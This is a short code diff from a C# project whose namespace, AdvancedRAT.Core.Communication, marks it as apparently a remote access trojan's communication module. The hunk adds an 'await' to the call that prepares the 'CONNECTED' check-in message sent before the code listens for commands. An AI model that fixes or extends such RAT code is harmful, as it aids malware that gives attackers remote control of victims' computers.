@@ -31,7 +31,7 @@ namespace AdvancedRAT.Core.Communication
                     stream = client.GetStream();
                     
                     // Send initial connection data
-                    var initialData = PrepareData("CONNECTED");
+                    var initialData = await PrepareData("CONNECTED");
                     await SendData(initialData);
                     
                     // Listen for commands
